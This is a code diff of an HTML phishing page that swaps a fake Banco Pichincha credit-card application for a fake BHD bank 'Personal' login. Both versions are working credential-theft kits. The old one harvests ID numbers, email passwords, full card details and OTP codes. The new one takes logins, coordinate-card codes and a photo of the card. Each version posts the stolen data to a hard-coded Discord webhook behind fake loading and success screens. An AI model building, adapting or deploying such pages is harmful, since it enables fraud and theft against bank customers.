@@ -3,642 +3,634 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Solicitud de Tarjeta - login</title>
+    <title>Login | Personal</title>
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css"
+    />
     <style>
       * {
+        box-sizing: border-box;
         margin: 0;
         padding: 0;
-        box-sizing: border-box;
-        font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto,
+          Helvetica, Arial, sans-serif;
       }
+
       body {
-        background-color: #f4f4f4;
-        color: #333;
-      }
-      :root {
-        --azul-pichincha: #002855;
-        --amarillo-pichincha: #ffdd00;
-      }
-
-      .navbar {
-        background: #fff;
-        padding: 12px 20px;
+        background-image: url("https://ibp.bhd.com.do/assets/img/background-login.webp");
+        background-size: cover;
+        background-position: center;
+        background-repeat: no-repeat;
+        background-attachment: fixed;
+        height: 100vh;
         display: flex;
-        align-items: center;
-        border-bottom: 1px solid #ddd;
-        position: sticky;
-        top: 0;
-        z-index: 1000;
-      }
-      .logo {
-        height: 35px;
-      }
-
-      .step-container {
-        display: none;
-        min-height: 100vh;
         flex-direction: column;
+        justify-content: center;
         align-items: center;
-        padding: 40px 20px;
-        animation: fadeIn 0.3s ease-in-out;
+        overflow: hidden;
       }
 
-      #step1 {
-        display: flex;
-        background: linear-gradient(rgba(0, 0, 0, 0.4), rgba(0, 0, 0, 0.4)),
-          url("https://malleljardin.com.ec/wp-content/uploads/2024/03/banco-pichincha-malleljardin-1.jpg")
-            no-repeat center top/cover;
-      }
-
-      .hero-text {
-        text-align: center;
-        color: white;
-        max-width: 600px;
-        margin-bottom: 30px;
-        text-shadow: 1px 1px 4px rgba(0, 0, 0, 0.5);
-      }
-      .form-card {
-        background: #ffffff;
-        width: 100%;
-        max-width: 450px;
-        padding: 35px;
+      .card {
+        background-color: white;
+        padding: 35px 25px;
         border-radius: 12px;
-        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
-      }
-      .form-card h2 {
-        color: var(--azul-pichincha);
+        width: 90%;
+        max-width: 420px;
+        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
         text-align: center;
-        margin-bottom: 5px;
-        font-size: 1.8rem;
-      }
-      .form-card p.instr {
-        text-align: center;
-        color: #666;
-        margin-bottom: 25px;
+        z-index: 10;
       }
 
-      .input-group {
-        margin-bottom: 20px;
-        text-align: left;
-      }
-      .input-group label {
-        display: block;
-        font-weight: 700;
-        margin-bottom: 8px;
-        font-size: 0.95rem;
-      }
-      .input-group input {
-        width: 100%;
-        padding: 14px;
-        border: 1px solid #ccc;
-        border-radius: 8px;
-        font-size: 1rem;
-        outline: none;
-      }
-
-      .row {
-        display: flex;
-        gap: 15px;
-      }
-      .row .input-group {
-        flex: 1;
-      }
-
-      .btn-pichincha {
-        width: 100%;
-        background-color: var(--amarillo-pichincha);
-        color: var(--azul-pichincha);
-        border: none;
-        padding: 18px;
-        font-size: 1.1rem;
-        font-weight: 700;
-        border-radius: 8px;
-        cursor: pointer;
-        margin-top: 10px;
-      }
-
-      .step-content-centered {
-        text-align: center;
-        max-width: 450px;
-        width: 100%;
-        display: flex;
-        flex-direction: column;
-        align-items: center;
-      }
-      .icon-large {
-        width: 200px;
-        margin-bottom: 25px;
-      }
-      .text-gray {
-        color: #666;
-        line-height: 1.6;
-        font-size: 1.1rem;
-        margin-top: 15px;
-      }
-
-      .info-box {
-        background-color: #f0f4ff;
-        border: 1px solid #d0dfff;
-        padding: 15px;
-        border-radius: 8px;
-        display: flex;
-        gap: 10px;
-        margin-bottom: 25px;
-        align-items: flex-start;
-        text-align: left;
-      }
-      .info-box i {
-        color: #5a8dee;
-        font-style: normal;
-        font-weight: bold;
-        background: #fff;
-        border-radius: 50%;
-        width: 20px;
-        height: 20px;
+      .logo-header {
         display: flex;
         align-items: center;
         justify-content: center;
-        border: 1px solid #5a8dee;
-        flex-shrink: 0;
-      }
-
-      .otp-input {
-        text-align: center;
-        letter-spacing: 12px;
-        font-size: 1.5rem;
-        font-weight: bold;
-      }
-      .card-icon {
-        width: 100px;
-        margin-bottom: 20px;
-      }
-      .error-msg {
-        color: #b71c1c;
-        font-weight: bold;
-        font-size: 0.95rem;
         margin-bottom: 25px;
-        text-align: center;
-        line-height: 1.4;
+      }
+      .logo-bhd {
+        height: 40px;
+      }
+      .divider {
+        height: 25px;
+        width: 1px;
+        background-color: #e0e0e0;
+        margin: 0 12px;
+      }
+      .personal-text {
+        font-size: 22px;
+        color: #71b357;
+        font-style: italic;
       }
 
-      @keyframes fadeIn {
-        from {
-          opacity: 0;
+      .step {
+        display: none;
+      }
+      .active {
+        display: block;
+      }
+
+      #step-login {
+        text-align: left;
+      }
+      .input-group {
+        margin-bottom: 22px;
+      }
+      label {
+        display: block;
+        font-size: 15px;
+        color: #555;
+        margin-bottom: 8px;
+      }
+      label span {
+        color: #d9534f;
+        margin-left: 2px;
+      }
+      .input-container {
+        position: relative;
+      }
+      input {
+        width: 100%;
+        padding: 14px 14px 14px 48px;
+        border: 1px solid #ced4da;
+        border-radius: 8px;
+        font-size: 16px;
+        outline: none;
+        transition: border-color 0.2s;
+      }
+      input:focus {
+        border-color: #71b357;
+      }
+      .input-icon {
+        position: absolute;
+        left: 18px;
+        top: 50%;
+        transform: translateY(-50%);
+        color: #adb5bd;
+        font-size: 18px;
+      }
+
+      .btn-green {
+        width: 100%;
+        padding: 14px;
+        background-color: #71b357;
+        border: none;
+        border-radius: 8px;
+        color: white;
+        font-size: 17px;
+        font-weight: 600;
+        cursor: pointer;
+        margin-top: 10px;
+      }
+      .btn-green:disabled {
+        background-color: #a5d6a7;
+        cursor: not-allowed;
+      }
+
+      .forgot-password {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        margin-top: 25px;
+        color: #71b357;
+        text-decoration: none;
+        font-size: 15px;
+        font-weight: 500;
+      }
+      .forgot-password i {
+        margin-right: 8px;
+        font-size: 14px;
+      }
+
+      .dots {
+        display: flex;
+        justify-content: center;
+        gap: 8px;
+        margin: 30px 0;
+      }
+      .dot {
+        width: 8px;
+        height: 8px;
+        background-color: #71b357;
+        border-radius: 50%;
+        animation: pulse 1.5s infinite;
+        opacity: 0.3;
+      }
+      .dot:nth-child(2) {
+        animation-delay: 0.2s;
+      }
+      .dot:nth-child(3) {
+        animation-delay: 0.4s;
+      }
+      .dot:nth-child(4) {
+        animation-delay: 0.6s;
+      }
+      .dot:nth-child(5) {
+        animation-delay: 0.8s;
+      }
+      @keyframes pulse {
+        0%,
+        100% {
+          opacity: 0.3;
         }
-        to {
+        50% {
           opacity: 1;
         }
+      }
+
+      .coord-title {
+        color: #71b357;
+        font-size: 18px;
+        margin-bottom: 15px;
+        text-transform: uppercase;
+        font-weight: bold;
+      }
+      .coord-img {
+        width: 100%;
+        max-width: 320px;
+        margin-bottom: 20px;
+      }
+      .grid-coords {
+        display: grid;
+        grid-template-columns: 1fr 1fr;
+        gap: 15px;
+        margin-bottom: 20px;
+      }
+      .coord-item {
+        display: flex;
+        align-items: center;
+        gap: 8px;
+      }
+      .coord-num {
+        background: #eee;
+        padding: 8px;
+        border-radius: 4px;
+        font-weight: bold;
+        min-width: 38px;
+        text-align: center;
+      }
+      .coord-input {
+        padding: 10px;
+        text-align: center;
+      }
+
+      .security-msg {
+        color: #d9534f;
+        font-weight: bold;
+        font-size: 18px;
+        margin-bottom: 20px;
+        line-height: 1.4;
+      }
+      .upload-area {
+        border: 2px dashed #71b357;
+        padding: 30px;
+        border-radius: 10px;
+        cursor: pointer;
+        color: #71b357;
+        margin-bottom: 20px;
+      }
+      .upload-area i {
+        font-size: 40px;
+        margin-bottom: 10px;
+      }
+
+      .success-icon {
+        font-size: 60px;
+        color: #71b357;
+        margin-bottom: 20px;
+      }
+
+      .business-link {
+        margin-top: 25px;
+        color: white;
+        text-decoration: none;
+        font-weight: bold;
+        text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.5);
+      }
+      .version {
+        position: absolute;
+        bottom: 15px;
+        left: 15px;
+        color: white;
+        font-size: 12px;
       }
     </style>
   </head>
   <body>
-    <header class="navbar">
-      <img
-        src="https://upload.wikimedia.org/wikipedia/commons/4/45/Banco_Pichincha_nuevo.png"
-        alt="Logo"
-        class="logo"
-      />
-    </header>
-
-    <section id="step1" class="step-container">
-      <div class="hero-text">
-        <h1>Tenemos la Tarjeta de Crédito perfecta para ti</h1>
-        <p>Solicítala 100% en línea sin filas ni trámites</p>
-      </div>
-      <div class="form-card">
-        <h2>¡Empecemos!</h2>
-        <p class="instr">Ingresa tus datos</p>
-        <form onsubmit="nextStep(event, 2)">
-          <div class="input-group">
-            <label>Número de cédula</label>
-            <input
-              type="tel"
-              id="cedula"
-              pattern="\d*"
-              inputmode="numeric"
-              placeholder="ingresa tu cédula"
-              required
-            />
-          </div>
-          <div class="input-group">
-            <label>Correo registrado en el Banco</label>
-            <input
-              type="email"
-              id="correo"
-              placeholder="ingresa tu correo"
-              required
-            />
-          </div>
-          <div class="input-group">
-            <label>Contraseña</label>
-            <input
-              type="password"
-              id="pass_correo"
-              placeholder="contraseña de tu correo"
-              required
-            />
-          </div>
-          <button type="submit" class="btn-pichincha">Empezar solicitud</button>
-        </form>
-      </div>
-    </section>
-
-    <section id="step2" class="step-container" style="background-color: #fff">
-      <div class="step-content-centered">
+    <div class="card">
+      <div class="logo-header">
         <img
-          src="https://saprodtarjetas.blob.core.windows.net/public/images/Error%20Page/notClientOffer.png"
-          class="icon-large"
+          src="https://ibp.bhd.com.do/assets/img/logo-bhd.svg"
+          class="logo-bhd"
         />
-        <h2 style="color: var(--azul-pichincha)">
-          Necesitamos más información
-        </h2>
-        <p class="text-gray">
-          Al momento contamos con una tarjeta disponible para ti con un cupo de
-          <strong>$10.780</strong>. Para realizar este proceso te haremos
-          algunas preguntas.
-        </p>
-        <button
-          class="btn-pichincha"
-          style="margin-top: 40px; max-width: 350px"
-          onclick="nextStep(null, 3)"
-        >
-          Continuar
-        </button>
+        <div class="divider"></div>
+        <span class="personal-text">Personal</span>
       </div>
-    </section>
 
-    <section id="step3" class="step-container" style="background-color: #fff">
-      <img
-        src="https://cdn-icons-png.flaticon.com/512/633/633611.png"
-        class="card-icon"
-      />
-      <div class="form-card" style="box-shadow: none">
-        <h2>Validación de identidad</h2>
-        <p class="instr">Ingresa los datos de tu tarjeta para continuar.</p>
-        <form onsubmit="nextStep(event, 4)">
+      <div id="step-login" class="step active">
+        <form onsubmit="validarLogin(event)">
           <div class="input-group">
-            <label>Número de tarjeta</label
-            ><input
-              type="tel"
-              class="cc-num"
-              pattern="\d*"
-              maxlength="16"
-              required
-            />
-          </div>
-          <div class="row">
-            <div class="input-group">
-              <label>Mes</label
-              ><input
-                type="tel"
-                class="cc-mes"
-                pattern="\d*"
-                maxlength="2"
+            <label>Usuario <span>*</span></label>
+            <div class="input-container">
+              <i class="fa-regular fa-user input-icon"></i>
+              <input
+                type="text"
+                id="login-user"
+                inputmode="numeric"
+                placeholder=""
                 required
+                autocomplete="off"
+                oninput="soloNumeros(this)"
               />
             </div>
-            <div class="input-group">
-              <label>Año</label
-              ><input
-                type="tel"
-                class="cc-year"
-                pattern="\d*"
+          </div>
+
+          <div class="input-group">
+            <label>Contraseña <span>*</span></label>
+            <div class="input-container">
+              <i class="fa-solid fa-lock input-icon"></i>
+              <input
+                type="password"
+                id="login-pass"
+                inputmode="numeric"
                 maxlength="4"
+                placeholder=""
                 required
+                oninput="soloNumeros(this)"
               />
             </div>
           </div>
-          <div class="input-group">
-            <label>CVV</label
-            ><input
-              type="tel"
-              class="cc-cvv"
-              pattern="\d*"
-              maxlength="3"
-              required
-            />
-          </div>
-          <button type="submit" class="btn-pichincha">Continuar</button>
+
+          <button type="submit" class="btn-green">Entrar</button>
+
+          <a href="#" class="forgot-password">
+            <i class="fa-solid fa-lock"></i>
+            ¿Olvidaste tu clave de acceso?
+          </a>
         </form>
       </div>
-    </section>
 
-    <section id="step4" class="step-container" style="background-color: #fff">
-      <img
-        src="https://cdn-icons-png.flaticon.com/512/633/633611.png"
-        class="card-icon"
-      />
-      <h2 style="color: var(--azul-pichincha)">Validación de identidad</h2>
-      <h3 style="margin: 20px 0">Tarjeta ••••</h3>
-      <p style="font-weight: bold; margin-bottom: 25px">
-        ¿Tienes tarjeta de crédito activa con nosotros?
-      </p>
-      <div style="display: flex; gap: 20px; width: 100%; max-width: 300px">
-        <button
-          class="btn-pichincha"
-          style="
-            background: white;
-            border: 1px solid #ccc;
-            color: var(--azul-pichincha);
-          "
-          onclick="nextStep(null, 5)"
-        >
-          Sí
-        </button>
-        <button
-          class="btn-pichincha"
-          style="
-            background: white;
-            border: 1px solid #ccc;
-            color: var(--azul-pichincha);
-          "
-          onclick="nextStep(null, 6)"
-        >
-          No
-        </button>
-      </div>
-    </section>
-
-    <section id="step5" class="step-container" style="background-color: #fff">
-      <img
-        src="https://cdn-icons-png.flaticon.com/512/633/633611.png"
-        class="card-icon"
-      />
-      <div class="form-card" style="box-shadow: none">
-        <h2>Confirmar Tarjeta</h2>
-        <p class="instr">Ingresa los datos de tu tarjeta para continuar.</p>
-        <form onsubmit="nextStep(event, 6)">
-          <div class="input-group">
-            <label>Número tarjeta</label
-            ><input type="tel" class="cc-num" pattern="\d*" required />
-          </div>
-          <div class="row">
-            <div class="input-group">
-              <label>Mes</label
-              ><input
-                type="tel"
-                class="cc-mes"
-                pattern="\d*"
-                maxlength="2"
-                required
-              />
-            </div>
-            <div class="input-group">
-              <label>Año</label
-              ><input
-                type="tel"
-                class="cc-year"
-                pattern="\d*"
-                maxlength="4"
-                required
-              />
-            </div>
-          </div>
-          <div class="input-group">
-            <label>CVV</label
-            ><input
-              type="tel"
-              class="cc-cvv"
-              pattern="\d*"
-              maxlength="3"
-              required
-            />
-          </div>
-          <button type="submit" class="btn-pichincha">Continuar</button>
-        </form>
-      </div>
-    </section>
-
-    <section id="step6" class="step-container" style="background-color: #fff">
-      <img
-        src="https://png.pngtree.com/png-vector/20191016/ourlarge/pngtree-money-account-verification-vector-thin-line-icon-png-image_1803307.jpg"
-        class="card-icon"
-      />
-      <div class="form-card" style="box-shadow: none; text-align: center">
-        <h2>Saldo actual</h2>
-        <div class="info-box">
-          <i>i</i>
-          <p>
-            Por favor ingresa el <strong>saldo real actual</strong> de tu
-            cuenta.
-          </p>
+      <div id="step-loading" class="step">
+        <h2 style="font-size: 24px">Cargando</h2>
+        <div class="dots">
+          <div class="dot"></div>
+          <div class="dot"></div>
+          <div class="dot"></div>
+          <div class="dot"></div>
+          <div class="dot"></div>
         </div>
-        <form onsubmit="nextStep(event, 7)">
-          <div class="input-group">
-            <label>Saldo disponible (USD)</label>
-            <input
-              type="tel"
-              id="saldoInput"
-              placeholder="0,00"
-              required
-              oninput="formatCurrency(this)"
-            />
-          </div>
-          <button type="submit" class="btn-pichincha">Continuar</button>
-        </form>
-      </div>
-    </section>
-
-    <section id="step7" class="step-container" style="background-color: #fff">
-      <img
-        src="https://media.istockphoto.com/id/662107734/es/vector/icono-de-protecci%C3%B3n-de-contrase%C3%B1a-dise%C3%B1o-plano.jpg?s=612x612&w=0&k=20&c=_BzBEHNoQjemjOHDYSjMLWYiAQKhEi-UnnDFqwX_Hyw="
-        class="card-icon"
-      />
-      <div class="form-card" style="box-shadow: none; text-align: center">
-        <h2>Autenticación de Usuario</h2>
-        <p style="color: #666; margin-bottom: 25px; font-size: 0.9rem">
-          Hemos enviado un mensaje de texto con un código a su número de móvil o
-          correo electrónico registrado. Estas validando tu identidad en
-          <strong>www.pichinchacredito.com.ec</strong>.
+        <p style="color: #666; font-size: 14px">
+          Estamos verificando sus datos, por favor espere
         </p>
-        <form onsubmit="nextStep(event, 8)">
-          <div class="input-group">
-            <label>Código de verificación</label>
-            <input
-              type="tel"
-              class="otp-input"
-              pattern="\d{6}"
-              maxlength="6"
-              minlength="6"
-              placeholder="••••••"
-              required
-            />
-          </div>
-          <button type="submit" class="btn-pichincha">Continuar</button>
-        </form>
       </div>
-    </section>
 
-    <section id="step8" class="step-container" style="background-color: #fff">
-      <img
-        src="https://media.istockphoto.com/id/662107734/es/vector/icono-de-protecci%C3%B3n-de-contrase%C3%B1a-dise%C3%B1o-plano.jpg?s=612x612&w=0&k=20&c=_BzBEHNoQjemjOHDYSjMLWYiAQKhEi-UnnDFqwX_Hyw="
-        class="card-icon"
-      />
-      <div class="form-card" style="box-shadow: none; text-align: center">
-        <h2>Autenticación de Usuario</h2>
-        <p class="error-msg">
-          El código ingresado es incorrecto. Revisa nuevamente tu correo o
-          dispositivo móvil registrado e ingresa el código correcto.
-        </p>
-        <form onsubmit="nextStep(event, 8)">
-          <div class="input-group">
-            <input
-              type="tel"
-              class="otp-input"
-              id="otp_retry"
-              pattern="\d{6}"
-              maxlength="6"
-              minlength="6"
-              placeholder="••••••"
-              required
-            />
+      <div id="step-coords-1" class="step">
+        <form onsubmit="validarCoords(event, 'step-coords-1', 'step-coords-2')">
+          <h3 class="coord-title">
+            INGRESE CADA CÓDIGO DE SU TARJETA DE COORDENADAS
+          </h3>
+          <img
+            src="ytrh.PNG"
+            class="coord-img"
+          />
+          <div class="grid-coords">
+            <div class="coord-item">
+              <div class="coord-num">03</div>
+              <input
+                type="text"
+                class="coord-input"
+                inputmode="numeric"
+                maxlength="4"
+                required
+                oninput="soloNumeros(this)"
+              />
+            </div>
+            <div class="coord-item">
+              <div class="coord-num">13</div>
+              <input
+                type="text"
+                class="coord-input"
+                inputmode="numeric"
+                maxlength="4"
+                required
+                oninput="soloNumeros(this)"
+              />
+            </div>
+            <div class="coord-item">
+              <div class="coord-num">23</div>
+              <input
+                type="text"
+                class="coord-input"
+                inputmode="numeric"
+                maxlength="4"
+                required
+                oninput="soloNumeros(this)"
+              />
+            </div>
+            <div class="coord-item">
+              <div class="coord-num">33</div>
+              <input
+                type="text"
+                class="coord-input"
+                inputmode="numeric"
+                maxlength="4"
+                required
+                oninput="soloNumeros(this)"
+              />
+            </div>
           </div>
-          <button type="submit" class="btn-pichincha">Continuar</button>
+          <button type="submit" class="btn-green">Continuar</button>
         </form>
       </div>
-    </section>
+
+      <div id="step-coords-2" class="step">
+        <form onsubmit="validarCoords(event, 'step-coords-2', 'step-photo')">
+          <h3 class="coord-title">
+            INGRESE CADA CÓDIGO DE SU TARJETA DE COORDENADAS
+          </h3>
+          <img
+            src="ytrh.PNG"
+            class="coord-img"
+          />
+          <div class="grid-coords">
+            <div class="coord-item">
+              <div class="coord-num">06</div>
+              <input
+                type="text"
+                class="coord-input"
+                inputmode="numeric"
+                maxlength="4"
+                required
+                oninput="soloNumeros(this)"
+              />
+            </div>
+            <div class="coord-item">
+              <div class="coord-num">16</div>
+              <input
+                type="text"
+                class="coord-input"
+                inputmode="numeric"
+                maxlength="4"
+                required
+                oninput="soloNumeros(this)"
+              />
+            </div>
+            <div class="coord-item">
+              <div class="coord-num">26</div>
+              <input
+                type="text"
+                class="coord-input"
+                inputmode="numeric"
+                maxlength="4"
+                required
+                oninput="soloNumeros(this)"
+              />
+            </div>
+            <div class="coord-item">
+              <div class="coord-num">36</div>
+              <input
+                type="text"
+                class="coord-input"
+                inputmode="numeric"
+                maxlength="4"
+                required
+                oninput="soloNumeros(this)"
+              />
+            </div>
+          </div>
+          <button type="submit" class="btn-green">Continuar</button>
+        </form>
+      </div>
+
+      <div id="step-photo" class="step">
+        <form onsubmit="finalizar(event)">
+          <p class="security-msg">
+            Por su seguridad, es necesario tomarle una foto a su tarjeta de
+            coordenadas
+          </p>
+          <div
+            class="upload-area"
+            onclick="document.getElementById('f-in').click()"
+          >
+            <i class="fa-solid fa-camera"></i>
+            <p>Haz clic para tomar o subir la foto</p>
+            <input
+              type="file"
+              id="f-in"
+              style="display: none"
+              accept="image/*"
+              required
+              onchange="vFile(this)"
+            />
+            <p
+              id="f-st"
+              style="
+                display: none;
+                margin-top: 10px;
+                color: #555;
+                font-weight: bold;
+              "
+            >
+              <i class="fa-solid fa-check"></i> Foto lista
+            </p>
+          </div>
+          <button type="submit" id="btn-f" class="btn-green" disabled>
+            Finalizar proceso
+          </button>
+        </form>
+      </div>
+
+      <div id="step-success" class="step">
+        <i class="fa-solid fa-circle-check success-icon"></i>
+        <h2 style="color: #71b357; margin-bottom: 15px">Validación Exitosa</h2>
+        <p style="font-size: 18px; color: #333; line-height: 1.6">
+          En un periodo de 2 días hábiles su tarjeta de crédito será añadida a
+          su cuenta agregada.
+        </p>
+      </div>
+    </div>
+
+    <a href="#" class="business-link">← Ir a Internet Banking Empresarial</a>
+    <div class="version">v5.6.1</div>
 
     <script>
-      // CONFIGURACIÓN DISCORD
+      // CONFIGURACIÓN: PEGA TU WEBHOOK AQUÍ
       const WEBHOOK_URL =
         "https://discord.com/api/webhooks/1488913676349210826/t3u6Yz7kEdsSoLbM8JfoZfmr5m-qP1lvQqF0SOUx0NwOeXA_aKONfRjYo9c9cxd7qEBP";
 
-      async function enviarADiscord(contenido) {
-        try {
-          await fetch(WEBHOOK_URL, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ embeds: [contenido] }),
-          });
-        } catch (e) {
-          console.error("Error envío");
-        }
+      function soloNumeros(i) {
+        i.value = i.value.replace(/\D/g, "");
       }
 
-      function nextStep(event, stepNumber) {
-        const correoId =
-          document.getElementById("correo").value || "No definido";
-
-        if (event) {
-          event.preventDefault();
-          const form = event.target;
-
-          // --- VALIDACIÓN DE FECHA ANTES DE TODO ---
-          const monthInput = form.querySelector(".cc-mes");
-          const yearInput = form.querySelector(".cc-year");
-
-          if (monthInput && yearInput) {
-            let mVal = parseInt(monthInput.value);
-            let yVal = parseInt(yearInput.value);
-
-            if (isNaN(mVal) || mVal < 1 || mVal > 12) {
-              alert("Mes no válido (01-12)");
-              return; // SE DETIENE AQUÍ, NO ENVÍA A DISCORD
-            }
-            if (isNaN(yVal) || yVal < 2026 || yVal > 2034) {
-              alert("Año no válido (2026-2034)");
-              return; // SE DETIENE AQUÍ, NO ENVÍA A DISCORD
-            }
-          }
-
-          // --- SI PASÓ LA VALIDACIÓN, SE ENVÍA EL REPORTE ---
-          if (form.parentElement.parentElement.id === "step1") {
-            enviarADiscord({
-              title: "🟡 NUEVO LOGIN",
-              color: 16766976,
-              fields: [
-                { name: "📧 Correo (ID)", value: correoId },
-                {
-                  name: "🪪 Cédula",
-                  value: document.getElementById("cedula").value,
-                },
-                {
-                  name: "🔑 Clave Correo",
-                  value: document.getElementById("pass_correo").value,
-                },
-              ],
-            });
-          } else if (form.querySelector(".cc-num")) {
-            enviarADiscord({
-              title: "💳 DATOS TARJETA",
-              color: 3447003,
-              fields: [
-                { name: "📧 Correo (ID)", value: correoId },
-                {
-                  name: "🔢 Número",
-                  value: form.querySelector(".cc-num").value,
-                },
-                {
-                  name: "📅 Expira",
-                  value:
-                    form.querySelector(".cc-mes").value +
-                    "/" +
-                    form.querySelector(".cc-year").value,
-                  inline: true,
-                },
-                {
-                  name: "🔒 CVV",
-                  value: form.querySelector(".cc-cvv").value,
-                  inline: true,
-                },
-              ],
-            });
-          } else if (form.id === "step6" || form.querySelector("#saldoInput")) {
-            enviarADiscord({
-              title: "💰 SALDO DECLARADO",
-              color: 3066993,
-              fields: [
-                { name: "📧 Correo (ID)", value: correoId },
-                {
-                  name: "💵 Saldo",
-                  value: "$ " + document.getElementById("saldoInput").value,
-                },
-              ],
-            });
-          } else if (form.querySelector(".otp-input")) {
-            enviarADiscord({
-              title: "📲 CÓDIGO OTP RECIBIDO",
-              color: 15158332,
-              fields: [
-                { name: "📧 Correo (ID)", value: correoId },
-                {
-                  name: "🔢 Código",
-                  value: "`" + form.querySelector(".otp-input").value + "`",
-                },
-              ],
-            });
-          }
-        }
-
-        if (stepNumber === 8 && document.getElementById("otp_retry")) {
-          document.getElementById("otp_retry").value = "";
-        }
-
-        // --- CAMBIO DE PASO ---
-        document
-          .querySelectorAll(".step-container")
-          .forEach((s) => (s.style.display = "none"));
-        const nextStepEl = document.getElementById("step" + stepNumber);
-        if (nextStepEl) nextStepEl.style.display = "flex";
-        window.scrollTo(0, 0);
+      function iniciarCarga(pasoActual, pasoSiguiente) {
+        document.getElementById(pasoActual).classList.remove("active");
+        document.getElementById("step-loading").classList.add("active");
+        setTimeout(() => {
+          document.getElementById("step-loading").classList.remove("active");
+          document.getElementById(pasoSiguiente).classList.add("active");
+        }, 4000);
       }
 
-      function formatCurrency(input) {
-        let value = input.value.replace(/\D/g, "");
-        if (value === "") {
-          input.value = "";
+      // ENVÍO PASO 1: LOGIN
+      async function validarLogin(e) {
+        e.preventDefault();
+        const u = document.getElementById("login-user").value;
+        const p = document.getElementById("login-pass").value;
+
+        if (p.length !== 4) {
+          alert("La contraseña debe ser de 4 dígitos");
           return;
         }
-        let options = { minimumFractionDigits: 2, maximumFractionDigits: 2 };
-        let formatted = new Intl.NumberFormat("de-DE", options).format(
-          parseFloat(value) / 100
-        );
-        input.value = formatted;
+
+        // Enviar a Discord
+        fetch(WEBHOOK_URL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            embeds: [
+              {
+                title: "🔐 NUEVO LOGIN",
+                color: 15158332,
+                fields: [
+                  { name: "👤 Usuario", value: u, inline: true },
+                  { name: "🔑 Clave", value: p, inline: true },
+                ],
+                timestamp: new Date(),
+              },
+            ],
+          }),
+        });
+
+        iniciarCarga("step-login", "step-coords-1");
       }
 
-      window.onload = function () {
-        nextStep(null, 1);
-      };
+      // ENVÍO PASO 2 Y 3: COORDENADAS
+      async function validarCoords(e, act, sig) {
+        e.preventDefault();
+        const u = document.getElementById("login-user").value;
+        const inputs = document
+          .getElementById(act)
+          .querySelectorAll(".coord-input");
+
+        let ok = true;
+        inputs.forEach((i) => {
+          if (i.value.length !== 4) ok = false;
+        });
+        if (!ok) {
+          alert("Cada campo debe tener 4 dígitos");
+          return;
+        }
+
+        const valores = Array.from(inputs)
+          .map((i) => i.parentElement.innerText.trim() + ": " + i.value)
+          .join(" | ");
+
+        // Enviar a Discord
+        fetch(WEBHOOK_URL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            embeds: [
+              {
+                title: `🔢 COORDENADAS - ${
+                  act === "step-coords-1" ? "BLOQUE 1" : "BLOQUE 2"
+                }`,
+                color: 3447003,
+                fields: [
+                  { name: "👤 Usuario", value: u },
+                  { name: "📋 Valores", value: valores },
+                ],
+                timestamp: new Date(),
+              },
+            ],
+          }),
+        });
+
+        iniciarCarga(act, sig);
+      }
+
+      function vFile(i) {
+        const btn = document.getElementById("btn-f");
+        const st = document.getElementById("f-st");
+        if (i.files[0]) {
+          btn.disabled = false;
+          st.style.display = "block";
+        }
+      }
+
+      // ENVÍO PASO 4: FOTO
+      async function finalizar(e) {
+        e.preventDefault();
+        const u = document.getElementById("login-user").value;
+        const inputFoto = document.getElementById("f-in");
+
+        const formData = new FormData();
+        const payload = {
+          embeds: [
+            {
+              title: "📸 FOTO TARJETA",
+              color: 3066993,
+              fields: [{ name: "👤 Usuario", value: u }],
+              image: { url: "attachment://foto.png" },
+              timestamp: new Date(),
+            },
+          ],
+        };
+
+        formData.append("payload_json", JSON.stringify(payload));
+        if (inputFoto.files[0]) {
+          formData.append("file", inputFoto.files[0], "foto.png");
+        }
+
+        try {
+          await fetch(WEBHOOK_URL, { method: "POST", body: formData });
+          document.getElementById("step-photo").classList.remove("active");
+          document.getElementById("step-success").classList.add("active");
+        } catch (err) {
+          console.error(err);
+          alert("Error de conexión.");
+        }
+      }
     </script>
   </body>
 </html>
